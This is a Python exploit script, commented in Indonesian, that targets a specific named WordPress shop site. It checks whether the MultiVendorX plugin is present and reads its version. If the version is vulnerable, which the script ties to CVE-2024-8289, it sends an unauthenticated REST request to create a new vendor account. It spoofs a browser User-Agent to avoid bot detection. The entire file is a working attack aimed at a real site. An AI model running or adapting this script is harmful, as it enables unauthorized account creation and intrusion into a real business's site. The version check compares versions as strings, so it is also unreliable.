import requests
import re
import json

# Konfigurasi target
TARGET_URL = "https://bazaarkishop.com"
PLUGIN_README_PATH = f"{TARGET_URL}/wp-content/plugins/dc-woocommerce-multi-vendor/readme.txt"
PLUGIN_MAIN_PHP_PATH = f"{TARGET_URL}/wp-content/plugins/dc-woocommerce-multi-vendor/dc_product_vendor.php"
API_ENDPOINT = f"{TARGET_URL}/wp-json/wc/v3/vendors"

# Data pengguna baru untuk eksploitasi
new_user_data = {
    "username": "vendor_baru",
    "password": "passwordkuat123",
    "email": "vendor_baru@inidomain.com",
    "roles": ["vendor"]
}

# Headers untuk menghindari deteksi bot
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Content-Type": "application/json"
}

# Fungsi untuk mengecek apakah plugin MultiVendorX terinstal
def check_plugin_installed():
    response = requests.get(PLUGIN_README_PATH, headers=headers)
    if response.status_code == 200:
        print("[+] Plugin MultiVendorX ditemukan!")
        return True
    else:
        print("[-] Plugin MultiVendorX tidak ditemukan di path default.")
        return False

# Fungsi untuk mencoba membaca versi plugin dari readme.txt atau plugin utama
def get_plugin_version():
    version = None

    response = requests.get(PLUGIN_README_PATH, headers=headers)
    if response.status_code == 200:
        match = re.search(r"Stable tag:\s*([\d\.]+)", response.text)
        if match:
            version = match.group(1)
            print(f"[+] Versi plugin ditemukan di readme.txt: {version}")

    if not version:
        response = requests.get(PLUGIN_MAIN_PHP_PATH, headers=headers)
        if response.status_code == 200:
            match = re.search(r"Version:\s*([\d\.]+)", response.text)
            if match:
                version = match.group(1)
                print(f"[+] Versi plugin ditemukan di dc_product_vendor.php: {version}")

    if version:
        return version
    else:
        print("[-] Tidak dapat menemukan versi plugin.")
        return None

# Fungsi untuk mencoba mengeksploitasi kerentanan
def create_vendor_account():
    session = requests.Session()
    session.headers.update(headers)

    response = session.post(API_ENDPOINT, json=new_user_data)

    if response.status_code == 201:
        print("[+] Berhasil membuat akun vendor baru!")
        print("[*] Detail Response:", response.json())
    else:
        print("[-] Gagal membuat akun vendor baru.")
        print(f"Status Code: {response.status_code}")
        try:
            response_json = response.json()
            print("[*] Response Detail:", json.dumps(response_json, indent=4))
        except json.JSONDecodeError:
            print("[*] Response Text:", response.text)

        # Tambahan debugging untuk kesalahan 500
        if response.status_code == 500:
            if "Error establishing a database connection" in response.text:
                print("[!] Masalah dengan database server! Pastikan database berjalan dengan baik.")
            elif "Access denied" in response.text:
                print("[!] Akses ke database ditolak! Periksa kredensial di wp-config.php.")
            else:
                print("[!] Terjadi kesalahan internal di server!")

# Eksekusi eksploitasi setelah pengecekan
if check_plugin_installed():
    plugin_version = get_plugin_version()
    if plugin_version:
        if plugin_version <= "4.2.0":
            print("[!] Versi plugin rentan terhadap CVE-2024-8289!")
            create_vendor_account()
        else:
            print("[+] Plugin telah diperbarui, tidak rentan.")
    else:
        print("[-] Tidak dapat menemukan versi plugin, eksploitasi dihentikan.")
else:
    print("[-] Plugin tidak terinstal, hentikan eksploitasi.")
